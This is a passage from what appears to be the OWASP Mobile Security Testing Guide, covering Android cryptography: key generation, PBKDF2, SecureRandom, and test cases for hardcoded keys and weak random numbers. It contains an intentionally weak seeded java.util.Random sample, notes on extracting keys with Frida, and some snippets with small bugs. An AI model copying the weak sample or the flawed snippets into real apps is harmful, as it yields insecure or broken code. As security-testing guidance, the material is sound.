\NormalTok{            .}\FunctionTok{append}\NormalTok{(provider.}\FunctionTok{getVersion}\NormalTok{())}
\NormalTok{            .}\FunctionTok{append}\NormalTok{(}\StringTok{"("}\NormalTok{)}
\NormalTok{            .}\FunctionTok{append}\NormalTok{(provider.}\FunctionTok{getInfo}\NormalTok{())}
\NormalTok{            .}\FunctionTok{append}\NormalTok{(}\StringTok{")}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{);}
\NormalTok{\}}
\BuiltInTok{String}\NormalTok{ providers = builder.}\FunctionTok{toString}\NormalTok{();}
\CommentTok{//now display the string on the screen or in the logs for debugging.}
\end{Highlighting}
\end{Shaded}

Below you can find the output of a running Android 4.4 (API level 19) in
an emulator with Google Play APIs, after the security provider has been
patched:

\begin{verbatim}
provider: GmsCore_OpenSSL1.0 (Android's OpenSSL-backed security provider)
provider: AndroidOpenSSL1.0 (Android's OpenSSL-backed security provider)
provider: DRLCertFactory1.0 (ASN.1, DER, PkiPath, PKCS7)
provider: BC1.49 (BouncyCastle Security Provider v1.49)
provider: Crypto1.0 (HARMONY (SHA1 digest; SecureRandom; SHA1withDSA signature))
provider: HarmonyJSSE1.0 (Harmony JSSE Provider)
provider: AndroidKeyStore1.0 (Android AndroidKeyStore security provider)
\end{verbatim}

Below you can find the output of a running Android 9 (API level 28) in
an emulator with Google Play APIs:

\begin{verbatim}
provider: AndroidNSSP 1.0(Android Network Security Policy Provider)
provider: AndroidOpenSSL 1.0(Android's OpenSSL-backed security provider)
provider: CertPathProvider 1.0(Provider of CertPathBuilder and CertPathVerifier)
provider: AndroidKeyStoreBCWorkaround 1.0(Android KeyStore security provider to work around Bouncy Castle)
provider: BC 1.57(BouncyCastle Security Provider v1.57)
provider: HarmonyJSSE 1.0(Harmony JSSE Provider)
provider: AndroidKeyStore 1.0(Android KeyStore security provider)
\end{verbatim}

\hypertarget{updating-security-provider}{%
\subparagraph{Updating security
provider}\label{updating-security-provider}}

Keeping up-to-date and patched component is one of security principles.
The same applies to \texttt{provider}. Application should check if used
security provider is up-to-date and if not,
\href{https://developer.android.com/training/articles/security-gms-provider}{update
it}. It is related to
\href{0x05i-Testing-Code-Quality-and-Build-Settings.md\#checking-for-weaknesses-in-third-party-libraries}{Checking
for Weaknesses in Third Party Libraries (MSTG-CODE-5)}.

\hypertarget{older-android-versions}{%
\subparagraph{Older Android versions}\label{older-android-versions}}

For some applications that support older versions of Android (e.g.: only
used versions lower than Android 7.0 (API level 24)), bundling an
up-to-date library may be the only option. Spongy Castle (a repackaged
version of Bouncy Castle) is a common choice in these situations.
Repackaging is necessary because Bouncy Castle is included in the
Android SDK. The latest version of
\href{https://rtyley.github.io/spongycastle/}{Spongy Castle} likely
fixes issues encountered in the earlier versions of
\href{https://www.cvedetails.com/vulnerability-list/vendor_id-7637/Bouncycastle.html}{Bouncy
Castle} that were included in Android. Note that the Bouncy Castle
libraries packed with Android are often not as complete as their
counterparts from the
\href{https://www.bouncycastle.org/java.html}{legion of the Bouncy
Castle}. Lastly: bear in mind that packing large libraries such as
Spongy Castle will often lead to a multidexed Android application.

\hypertarget{key-generation}{%
\paragraph{Key Generation}\label{key-generation}}

Android SDK provides mechanisms for specifying secure key generation and
use. Android 6.0 (API level 23) introduced the
\texttt{KeyGenParameterSpec} class that can be used to ensure the
correct key usage in the application.

Here's an example of using AES/CBC/PKCS7Padding on API 23+:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ keyAlias = }\StringTok{"MySecretKey"}\NormalTok{;}

\NormalTok{KeyGenParameterSpec keyGenParameterSpec = }\KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{(keyAlias,}
\NormalTok{        KeyProperties.}\FunctionTok{PURPOSE\_ENCRYPT}\NormalTok{ | KeyProperties.}\FunctionTok{PURPOSE\_DECRYPT}\NormalTok{)}
\NormalTok{        .}\FunctionTok{setBlockModes}\NormalTok{(KeyProperties.}\FunctionTok{BLOCK\_MODE\_CBC}\NormalTok{)}
\NormalTok{        .}\FunctionTok{setEncryptionPaddings}\NormalTok{(KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_PKCS7}\NormalTok{)}
\NormalTok{        .}\FunctionTok{setRandomizedEncryptionRequired}\NormalTok{(}\KeywordTok{true}\NormalTok{)}
\NormalTok{        .}\FunctionTok{build}\NormalTok{();}

\BuiltInTok{KeyGenerator}\NormalTok{ keyGenerator = }\BuiltInTok{KeyGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_AES}\NormalTok{,}
        \StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyGenerator.}\FunctionTok{init}\NormalTok{(keyGenParameterSpec);}

\BuiltInTok{SecretKey}\NormalTok{ secretKey = keyGenerator.}\FunctionTok{generateKey}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

The \texttt{KeyGenParameterSpec} indicates that the key can be used for
encryption and decryption, but not for other purposes, such as signing
or verifying. It further specifies the block mode (CBC), padding (PKCS
\#7), and explicitly specifies that randomized encryption is required
(this is the default). \texttt{"AndroidKeyStore"} is the name of
security provider used in this example. This will automatically ensure
that the keys are stored in the \texttt{AndroidKeyStore} which is
beneficiary for the protection of the key.

GCM is another AES block mode that provides additional security benefits
over other, older modes. In addition to being cryptographically more
secure, it also provides authentication. When using CBC (and other
modes), authentication would need to be performed separately, using
HMACs (see the
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' chapter). Note that GCM is the only
mode of AES that
\href{https://developer.android.com/training/articles/keystore.html\#SupportedCiphers}{does
not support paddings}.

Attempting to use the generated key in violation of the above spec would
result in a security exception.

Here's an example of using that key to encrypt:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ AES\_MODE = KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_AES}
\NormalTok{        + }\StringTok{"/"}\NormalTok{ + KeyProperties.}\FunctionTok{BLOCK\_MODE\_CBC}
\NormalTok{        + }\StringTok{"/"}\NormalTok{ + KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_PKCS7}\NormalTok{;}
\BuiltInTok{KeyStore}\NormalTok{ AndroidKeyStore = AndroidKeyStore.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AndroidKeyStore"}\NormalTok{);}

\CommentTok{// byte[] input}
\BuiltInTok{Key}\NormalTok{ key = AndroidKeyStore.}\FunctionTok{getKey}\NormalTok{(keyAlias, }\KeywordTok{null}\NormalTok{);}

\BuiltInTok{Cipher}\NormalTok{ cipher = }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(AES\_MODE);}
\NormalTok{cipher.}\FunctionTok{init}\NormalTok{(}\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{ENCRYPT\_MODE}\NormalTok{, key);}

\DataTypeTok{byte}\NormalTok{[] encryptedBytes = cipher.}\FunctionTok{doFinal}\NormalTok{(input);}
\DataTypeTok{byte}\NormalTok{[] iv = cipher.}\FunctionTok{getIV}\NormalTok{();}
\CommentTok{// save both the IV and the encryptedBytes}
\end{Highlighting}
\end{Shaded}

Both the IV (initialization vector) and the encrypted bytes need to be
stored; otherwise decryption is not possible.

Here's how that cipher text would be decrypted. The \texttt{input} is
the encrypted byte array and \texttt{iv} is the initialization vector
from the encryption step:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// byte[] input}
\CommentTok{// byte[] iv}
\BuiltInTok{Key}\NormalTok{ key = AndroidKeyStore.}\FunctionTok{getKey}\NormalTok{(AES\_KEY\_ALIAS, }\KeywordTok{null}\NormalTok{);}

\BuiltInTok{Cipher}\NormalTok{ cipher = }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(AES\_MODE);}
\BuiltInTok{IvParameterSpec}\NormalTok{ params = }\KeywordTok{new} \BuiltInTok{IvParameterSpec}\NormalTok{(iv);}
\NormalTok{cipher.}\FunctionTok{init}\NormalTok{(}\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{DECRYPT\_MODE}\NormalTok{, key, params);}

\DataTypeTok{byte}\NormalTok{[] result = cipher.}\FunctionTok{doFinal}\NormalTok{(input);}
\end{Highlighting}
\end{Shaded}

Since the IV is randomly generated each time, it should be saved along
with the cipher text (\texttt{encryptedBytes}) in order to decrypt it
later.

Prior to Android 6.0 (API level 23), AES key generation was not
supported. As a result, many implementations chose to use RSA and
generated a public-private key pair for asymmetric encryption using
\texttt{KeyPairGeneratorSpec} or used \texttt{SecureRandom} to generate
AES keys.

Here's an example of \texttt{KeyPairGenerator} and
\texttt{KeyPairGeneratorSpec} used to create the RSA key pair:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{Date}\NormalTok{ startDate = }\BuiltInTok{Calendar}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{().}\FunctionTok{getTime}\NormalTok{();}
\BuiltInTok{Calendar}\NormalTok{ endCalendar = }\BuiltInTok{Calendar}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{();}
\NormalTok{endCalendar.}\FunctionTok{add}\NormalTok{(}\BuiltInTok{Calendar}\NormalTok{.}\FunctionTok{YEAR}\NormalTok{, }\DecValTok{1}\NormalTok{);}
\BuiltInTok{Date}\NormalTok{ endDate = endCalendar.}\FunctionTok{getTime}\NormalTok{();}
\NormalTok{KeyPairGeneratorSpec keyPairGeneratorSpec = }\KeywordTok{new}\NormalTok{ KeyPairGeneratorSpec.}\FunctionTok{Builder}\NormalTok{(context)}
\NormalTok{        .}\FunctionTok{setAlias}\NormalTok{(RSA\_KEY\_ALIAS)}
\NormalTok{        .}\FunctionTok{setKeySize}\NormalTok{(}\DecValTok{4096}\NormalTok{)}
\NormalTok{        .}\FunctionTok{setSubject}\NormalTok{(}\KeywordTok{new} \BuiltInTok{X500Principal}\NormalTok{(}\StringTok{"CN="}\NormalTok{ + RSA\_KEY\_ALIAS))}
\NormalTok{        .}\FunctionTok{setSerialNumber}\NormalTok{(}\BuiltInTok{BigInteger}\NormalTok{.}\FunctionTok{ONE}\NormalTok{)}
\NormalTok{        .}\FunctionTok{setStartDate}\NormalTok{(startDate)}
\NormalTok{        .}\FunctionTok{setEndDate}\NormalTok{(endDate)}
\NormalTok{        .}\FunctionTok{build}\NormalTok{();}

\BuiltInTok{KeyPairGenerator}\NormalTok{ keyPairGenerator = }\BuiltInTok{KeyPairGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"RSA"}\NormalTok{,}
        \StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyPairGenerator.}\FunctionTok{initialize}\NormalTok{(keyPairGeneratorSpec);}

\BuiltInTok{KeyPair}\NormalTok{ keyPair = keyPairGenerator.}\FunctionTok{generateKeyPair}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

This sample creates the RSA key pair with a key size of 4096-bit
(i.e.~modulus size).

A symmetric encryption key can be generated from the passphrase by using
the Password Based Key Derivation Function version 2 (PBKDF2). This
cryptographic protocol is designed to generate a cryptographic keys,
which can be used for cryptography purpose. Input parameters for the
algorithm are adjusted according to
\href{0x04g-Testing-Cryptography.md\#weak-key-generation-functions}{weak
key generation function} section. The code listing below illustrates how
to generate a strong encryption key based on a password.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{static} \BuiltInTok{SecretKey} \FunctionTok{generateStrongAESKey}\NormalTok{(}\DataTypeTok{char}\NormalTok{[] password, }\DataTypeTok{int}\NormalTok{ keyLength)}
\NormalTok{\{}
    \CommentTok{//Initiliaze objects and variables for later use}
    \DataTypeTok{int}\NormalTok{ iterationCount = }\DecValTok{10000}\NormalTok{;}
    \DataTypeTok{int}\NormalTok{ saltLength     = keyLength / }\DecValTok{8}\NormalTok{;}
    \BuiltInTok{SecureRandom}\NormalTok{ random = }\KeywordTok{new} \BuiltInTok{SecureRandom}\NormalTok{();}
    \CommentTok{//Generate the salt}
    \DataTypeTok{byte}\NormalTok{[] salt = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[saltLength];}
\NormalTok{    random.}\FunctionTok{nextBytes}\NormalTok{(salt);}
    \BuiltInTok{KeySpec}\NormalTok{ keySpec = }\KeywordTok{new} \BuiltInTok{PBEKeySpec}\NormalTok{(password.}\FunctionTok{toCharArray}\NormalTok{(), salt, iterationCount, keyLength);}
    \BuiltInTok{SecretKeyFactory}\NormalTok{ keyFactory = }\BuiltInTok{SecretKeyFactory}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"PBKDF2WithHmacSHA1"}\NormalTok{);}
    \DataTypeTok{byte}\NormalTok{[] keyBytes = keyFactory.}\FunctionTok{generateSecret}\NormalTok{(keySpec).}\FunctionTok{getEncoded}\NormalTok{();}
    \KeywordTok{return} \KeywordTok{new} \BuiltInTok{SecretKeySpec}\NormalTok{(keyBytes, }\StringTok{"AES"}\NormalTok{);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

The above method requires a character array containing the password and
the needed key length in bits, for instance a 128 or 256-bit AES key. We
define an iteration count of 10,000 rounds which will be used by the
PBKDF2 algorithm. Increasing number of iteration significantly increases
the workload for a brute-force attack on password, however it can affect
performance as more computational power is required for key derivation.
We define the salt size equal to the key length, we divide by 8 to take
care of the bit to byte conversion. We use the \texttt{SecureRandom}
class to randomly generate a salt. Obviously, the salt is something you
want to keep constant to ensure the same encryption key is generated
time after time for the same supplied password. Note that you can store
the salt privately in \texttt{SharedPreferences}. It is recommended to
exclude the salt from the Android backup mechanism to prevent
synchronization in case of higher risk data.

\begin{quote}
Note that if you take a rooted device or a patched (e.g.~repackaged)
application into account as a threat to the data, it might be better to
encrypt the salt with a key that is placed in the
\texttt{AndroidKeystore}. The Password-Based Encryption (PBE) key is
generated using the recommended \texttt{PBKDF2WithHmacSHA1} algorithm,
till Android 8.0 (API level 26). For higher API levels, it is best to
use \texttt{PBKDF2withHmacSHA256}, which will end up with a longer hash
value.
\end{quote}

Note: there is a widespread false believe that the NDK should be used to
hide cryptographic operations and hardcoded keys. However, using this
mechanisms is not effective. Attackers can still use tools to find the
mechanism used and make dumps of the key in memory. Next, the control
flow can be analyzed with e.g.~radare2 and the keys extracted with the
help of Frida or the combination of both: r2frida (see sections
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#disassembling-native-code}{Disassembling
Native Code}'',
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#memory-dump}{Memory
Dump}'' and
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#in-memory-search}{In-Memory
Search}'' in the chapter ``Tampering and Reverse Engineering on
Android'' for more details). From Android 7.0 (API level 24) onward, it
is not allowed to use private APIs, instead: public APIs need to be
called, which further impacts the effectiveness of hiding it away as
described in the
\href{https://android-developers.googleblog.com/2016/06/android-changes-for-ndk-developers.html}{Android
Developers Blog}

\hypertarget{random-number-generation}{%
\paragraph{Random number generation}\label{random-number-generation}}

Cryptography requires secure pseudo random number generation (PRNG).
Standard Java classes as \texttt{java.util.Random} do not provide
sufficient randomness and in fact may make it possible for an attacker
to guess the next value that will be generated, and use this guess to
impersonate another user or access sensitive information.

In general, \texttt{SecureRandom} should be used. However, if the
Android versions below Android 4.4 (API level 19) are supported,
additional care needs to be taken in order to work around the bug in
Android 4.1-4.3 (API level 16-18) versions that
\href{https://android-developers.googleblog.com/2013/08/some-securerandom-thoughts.html}{failed
to properly initialize the PRNG}.

Most developers should instantiate \texttt{SecureRandom} via the default
constructor without any arguments. Other constructors are for more
advanced uses and, if used incorrectly, can lead to decreased randomness
and security. The PRNG provider backing \texttt{SecureRandom} uses the
\texttt{SHA1PRNG} from \texttt{AndroidOpenSSL} (Conscrypt) provider.

\hypertarget{testing-symmetric-cryptography-mstg-crypto-1}{%
\subsubsection{Testing Symmetric Cryptography
(MSTG-CRYPTO-1)}\label{testing-symmetric-cryptography-mstg-crypto-1}}

\hypertarget{overview-15}{%
\paragraph{Overview}\label{overview-15}}

This test case focuses on hardcoded symmetric cryptography as the only
method of encryption. Following checks should be performed:

\begin{itemize}
\tightlist
\item
  identify all instance of symmectric cryptography
\item
  verify if symmetric keys in all identified instances are not hardcoded
\item
  verify if hardcoded symmetric cryptography is not used as the only
  method of encryption
\end{itemize}

\hypertarget{static-analysis-22}{%
\paragraph{Static Analysis}\label{static-analysis-22}}

Identify all the instances of symmetric key encryption in code and look
for mechanism which loads or provides a symmetric key. You can look for:

\begin{itemize}
\tightlist
\item
  symmetric algorithms (like \texttt{DES}, \texttt{AES}, etc.)
\item
  specifications for a key generator (like \texttt{KeyGenParameterSpec},
  \texttt{KeyPairGeneratorSpec}, \texttt{KeyPairGenerator},
  \texttt{KeyGenerator}, \texttt{KeyProperties}, etc.)
\item
  classes which uses \texttt{java.security.*}, \texttt{javax.crypto.*},
  \texttt{android.security.*} and \texttt{android.security.keystore.*}
  packages.
\end{itemize}

Verify that symmetric keys in all identified instances are not
hardcoded. Check if symmetric keys are not:

\begin{itemize}
\tightlist
\item
  part of application resources
\item
  values which can be derived from known values
\item
  hardcoded in code
\end{itemize}

Verify that all identified instances of hardcoded symmetric cryptography
is not used in security-sensitive contexts as the only method of
encryption.

As an example we illustrate how to locate the use of a hardcoded
encryption key. First disassemble the DEX bytecode to a collection of
Smali bytecode files using \texttt{Baksmali}.

\begin{verbatim}
$ baksmali d file.apk -o smali_output/
\end{verbatim}

Now that we have a collection of Smali bytecode files, we can search the
files for the usage of the \texttt{SecretKeySpec} class. We do this by
simply recursively grepping on the Smali source code we just obtained.
Please note that class descriptors in Smali start with \texttt{L} and
end with \texttt{;}:

\begin{verbatim}
$ grep -r "Ljavax\crypto\spec\SecretKeySpec;"
\end{verbatim}

This will highlight all the classes that use the \texttt{SecretKeySpec}
class, we now examine all the highlighted files and trace which bytes
are used to pass the key material. The figure below shows the result of
performing this assessment on a production ready application. For sake
of readability we have reverse engineered the DEX bytecode to Java code.
We can clearly locate the use of a static encryption key that is
hardcoded and initialized in the static byte array
\texttt{Encrypt.keyBytes}.

\hypertarget{dynamic-analysis-19}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-19}}

Hook cryptographic methods and analyze the keys that are being used.
Monitor file system access while cryptographic operations are being
performed to assess where key material is written to or read from.

\hypertarget{testing-the-configuration-of-cryptographic-standard-algorithms-mstg-crypto-2-mstg-crypto-3-and-mstg-crypto-4}{%
\subsubsection{Testing the Configuration of Cryptographic Standard
Algorithms (MSTG-CRYPTO-2, MSTG-CRYPTO-3 and
MSTG-CRYPTO-4)}\label{testing-the-configuration-of-cryptographic-standard-algorithms-mstg-crypto-2-mstg-crypto-3-and-mstg-crypto-4}}

\hypertarget{overview-16}{%
\paragraph{Overview}\label{overview-16}}

These test cases focus on implementation and use of cryptographic
primitives. Following checks should be performed:

\begin{itemize}
\tightlist
\item
  identify all instance of cryptography primitives and their
  implementation (library or custom implementation)
\item
  verify how cryptography primitives are used and how they are
  configured
\item
  verify if cryptographic protocols and algorithms used are not
  deprecated for security purposes.
\end{itemize}

\hypertarget{static-analysis-23}{%
\paragraph{Static Analysis}\label{static-analysis-23}}

Identify all the instances of the cryptographic primitives in code.
Identify all custom cryptography implementations. You can look for:

\begin{itemize}
\tightlist
\item
  classes \texttt{Cipher}, \texttt{Mac}, \texttt{MessageDigest},
  \texttt{Signature}
\item
  interfaces \texttt{Key}, \texttt{PrivateKey}, \texttt{PublicKey},
  \texttt{SecretKey}
\item
  functions \texttt{getInstance}, \texttt{generateKey}
\item
  exceptions \texttt{KeyStoreException}, \texttt{CertificateException},
  \texttt{NoSuchAlgorithmException}
\item
  classes which uses \texttt{java.security.*}, \texttt{javax.crypto.*},
  \texttt{android.security.*} and \texttt{android.security.keystore.*}
  packages.
\end{itemize}

Identify that all calls to getInstance use default \texttt{provider} of
security services by not specifing it (it means AndroidOpenSSL aka
Conscrypt). \texttt{Provider} can only be specified in \texttt{KeyStore}
related code (in that situation \texttt{KeyStore} should be provided as
\texttt{provider}). If other \texttt{provider} is specified it should be
verified according to situation and business case (i.e.~Android API
version), and \texttt{provider} should be examined against potential
vulnerabilities.

Ensure that the best practices outlined in the
``\href{0x04g-Testing-Cryptography.md}{Cryptography for Mobile Apps}''
chapter are followed. Look at
\href{0x04g-Testing-Cryptography.md\#identifying-insecure-and/or-deprecated-cryptographic-algorithms}{insecure
and deprecated algorithms} and
\href{0x04g-Testing-Cryptography.md\#common-configuration-issues}{common
configuration issues}.

\hypertarget{dynamic-analysis-20}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-20}}

Hook cryptographic methods and analyze the keys that are being used.
Monitor file system access while cryptographic operations are being
performed to assess where key material is written to or read from.

\hypertarget{testing-the-purposes-of-keys-mstg-crypto-5}{%
\subsubsection{Testing the Purposes of Keys
(MSTG-CRYPTO-5)}\label{testing-the-purposes-of-keys-mstg-crypto-5}}

\hypertarget{overview-17}{%
\paragraph{Overview}\label{overview-17}}

This test case focuses on verification of purpose and reusage of the
same cryptographic keys. Following checks should be performed:

\begin{itemize}
\tightlist
\item
  identify all instanaces where cryptography is used
\item
  identify purpose why cryptography is used (to protect data in use, in
  transit or at rest)
\item
  identify type of cryptography
\item
  verify if cryptography is used according to its purpose
\end{itemize}

\hypertarget{static-analysis-24}{%
\paragraph{Static Analysis}\label{static-analysis-24}}

Identify all instanaces where cryptography is used. You can look for:

\begin{itemize}
\tightlist
\item
  classes \texttt{Cipher}, \texttt{Mac}, \texttt{MessageDigest},
  \texttt{Signature}
\item
  interfaces \texttt{Key}, \texttt{PrivateKey}, \texttt{PublicKey},
  \texttt{SecretKey}
\item
  functions \texttt{getInstance}, \texttt{generateKey}
\item
  exceptions \texttt{KeyStoreException}, \texttt{CertificateException},
  \texttt{NoSuchAlgorithmException}
\item
  classes which uses \texttt{java.security.*}, \texttt{javax.crypto.*},
  \texttt{android.security.*} and \texttt{android.security.keystore.*}
  packages.
\end{itemize}

For all identified instance, identify purpose of using cryptography and
its type. It can be used :

\begin{itemize}
\tightlist
\item
  to encrypt/decrypt - that ensures confidentiality of data
\item
  to sign/verify - that ensures integrity of data (as well as
  accountability in some cases)
\item
  to maintance - that protects key during an operation (like import to
  KeyStore)
\end{itemize}

Additionally, you should identify business logic which uses identified
instances of cryptography. That should give you explanation why
cryptography is used from business perspective (i.e.~to protect
confidentiality of data at rest, to confirm that file was signed from
device X which belongs to Y).

During verification take the following checks should be performed:

\begin{itemize}
\tightlist
\item
  make sure that key is used according to purpose defined during its
  creation (it is relevant to KeyStore keys, which can have
  KeyProperties defined)
\item
  make sure that for asymmetric keys, the private key is exclusively
  used for signing and the public key is only used for encryption.
\item
  make sure that symmetric keys are not reused for multiple purposes. A
  new symmetric key should be generated if it's used in a different
  context.
\item
  make sure that cryptography is used according to business purpose.
\end{itemize}

\hypertarget{dynamic-analysis-21}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-21}}

Hook cryptographic methods and analyze the keys that are being used.
Monitor file system access while cryptographic operations are being
performed to assess where key material is written to or read from.

\hypertarget{testing-random-number-generation-mstg-crypto-6}{%
\subsubsection{Testing Random Number Generation
(MSTG-CRYPTO-6)}\label{testing-random-number-generation-mstg-crypto-6}}

\hypertarget{overview-18}{%
\paragraph{Overview}\label{overview-18}}

This test case focuses on random values used by application. Following
checks should be performed:

\begin{itemize}
\tightlist
\item
  identify all instances where random values are used and all instances
  of random number generators are of \texttt{Securerandom}
\item
  verify if random number generators are not consider as being
  cryptographically secure
\item
  verify how random number generators were used
\item
  verify randomness of random values generated by application
\end{itemize}

\hypertarget{static-analysis-25}{%
\paragraph{Static Analysis}\label{static-analysis-25}}

Identify all the instances of random number generators and look for
either custom or known insecure \texttt{java.util.Random} class. This
class produces an identical sequence of numbers for each given seed
value; consequently, the sequence of numbers is predictable.

The following sample source code shows weak random number generation:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import}\ImportTok{ java.util.Random;}
\CommentTok{// ...}

\BuiltInTok{Random}\NormalTok{ number = }\KeywordTok{new} \BuiltInTok{Random}\NormalTok{(}\DecValTok{123L}\NormalTok{);}
\CommentTok{//...}
\KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < }\DecValTok{20}\NormalTok{; i++) \{}
  \CommentTok{// Generate another random integer in the range [0, 20]}
  \DataTypeTok{int}\NormalTok{ n = number.}\FunctionTok{nextInt}\NormalTok{(}\DecValTok{21}\NormalTok{);}
  \BuiltInTok{System}\NormalTok{.}\FunctionTok{out}\NormalTok{.}\FunctionTok{println}\NormalTok{(n);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Instead a well-vetted algorithm should be used that is currently
considered to be strong by experts in the field, and select well-tested
implementations with adequate length seeds.

Identify all instances of \texttt{SecureRandom} that are not created
using the default constructor. Specifying the seed value may reduce
randomness. Prefer the
\href{https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers}{no-argument
constructor of \texttt{SecureRandom}} that uses the system-specified
seed value to generate a 128-byte-long random number.

In general, if a PRNG is not advertised as being cryptographically
secure (e.g.~\texttt{java.util.Random}), then it is probably a
statistical PRNG and should not be used in security-sensitive contexts.
Pseudo-random number generators
\href{https://www.securecoding.cert.org/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded}{can
produce predictable numbers} if the generator is known and the seed can
be guessed. A 128-bit seed is a good starting point for producing a
``random enough'' number.

The following sample source code shows the generation of a secure random
number:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import}\ImportTok{ java.security.SecureRandom;}
\KeywordTok{import}\ImportTok{ java.security.NoSuchAlgorithmException;}
\CommentTok{// ...}

\KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{main}\NormalTok{ (}\BuiltInTok{String}\NormalTok{ args[]) \{}
  \BuiltInTok{SecureRandom}\NormalTok{ number = }\KeywordTok{new} \BuiltInTok{SecureRandom}\NormalTok{();}
  \CommentTok{// Generate 20 integers 0..20}
  \KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < }\DecValTok{20}\NormalTok{; i++) \{}
    \BuiltInTok{System}\NormalTok{.}\FunctionTok{out}\NormalTok{.}\FunctionTok{println}\NormalTok{(number.}\FunctionTok{nextInt}\NormalTok{(}\DecValTok{21}\NormalTok{));}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{dynamic-analysis-22}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-22}}

Once an attacker is knowing what type of weak pseudo-random number
generator (PRNG) is used, it can be trivial to write proof-of-concept to
generate the next random value based on previously observed ones, as it
was
\href{https://franklinta.com/2014/08/31/predicting-the-next-math-random-in-java/}{done
for Java Random}. In case of very weak custom random generators it may
be possible to observe the pattern statistically. Although the
recommended approach would anyway be to decompile the APK and inspect
the algorithm (see Static Analysis).

If you want to test for randomness, you can try to capture a large set
of numbers and check with the Burp's
\href{https://portswigger.net/burp/documentation/desktop/tools/sequencer}{sequencer}
to see how good the quality of the randomness is.

\hypertarget{references-10}{%
\subsubsection{References}\label{references-10}}

\begin{itemize}
\tightlist
\item
  {[}\#nelenkov{]} - N. Elenkov, Android Security Internals, No Starch
  Press, 2014, Chapter 5.
\end{itemize}

\hypertarget{cryptography-references-1}{%
\paragraph{Cryptography references}\label{cryptography-references-1}}

\begin{itemize}
\tightlist
\item
  Android Developer blog: Changes for NDK Developers -
  \url{https://android-developers.googleblog.com/2016/06/android-changes-for-ndk-developers.html}
\item
  Android Developer blog: Crypto Provider Deprecated -
  \url{https://android-developers.googleblog.com/2016/06/security-crypto-provider-deprecated-in.html}
\item
  Android Developer blog: Cryptography Changes in Android P -
  \url{https://android-developers.googleblog.com/2018/03/cryptography-changes-in-android-p.html}
\item
  Android Developer blog: Some SecureRandom Thoughts -
  \url{https://android-developers.googleblog.com/2013/08/some-securerandom-thoughts.html}
\item
  Android Developer documentation -
  \url{https://developer.android.com/guide}
\item
  BSI Recommendations - 2017 - \url{https://www.keylength.com/en/8/}
\item
  Ida Pro - \url{https://www.hex-rays.com/products/ida/}
\item
  Legion of the Bouncy Castle -
  \url{https://www.bouncycastle.org/java.html}
\item
  NIST Key Length Recommendations -
  \url{https://www.keylength.com/en/4/}
\item
  Security Providers -
  \url{https://developer.android.com/reference/java/security/Provider.html}
\item
  Spongy Castle - \url{https://rtyley.github.io/spongycastle/}
\end{itemize}

\hypertarget{securerandom-references}{%
\paragraph{SecureRandom references}\label{securerandom-references}}

\begin{itemize}
\tightlist
\item
  Burpproxy its Sequencer -
  \url{https://portswigger.net/burp/documentation/desktop/tools/sequencer}
\item
  Proper Seeding of SecureRandom -
  \url{https://www.securecoding.cert.org/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded}
\end{itemize}

\hypertarget{testing-key-management-references}{%
\paragraph{Testing Key Management
references}\label{testing-key-management-references}}

\begin{itemize}
\tightlist
\item
  Android Keychain API -
  \url{https://developer.android.com/reference/android/security/KeyChain}
\item
  Android KeyStore API -
  \url{https://developer.android.com/reference/java/security/KeyStore.html}
\item
  Android Keystore system -
  \url{https://developer.android.com/training/articles/keystore\#java}
\item
  Android Pie features and APIs -
  \url{https://developer.android.com/about/versions/pie/android-9.0\#secure-key-import}
\item
  KeyInfo Documentation -
  \url{https://developer.android.com/reference/android/security/keystore/KeyInfo}
\item
  SharedPreferences -
  \url{https://developer.android.com/reference/android/content/SharedPreferences.html}
\end{itemize}

\hypertarget{key-attestation-references}{%
\paragraph{Key Attestation
References}\label{key-attestation-references}}
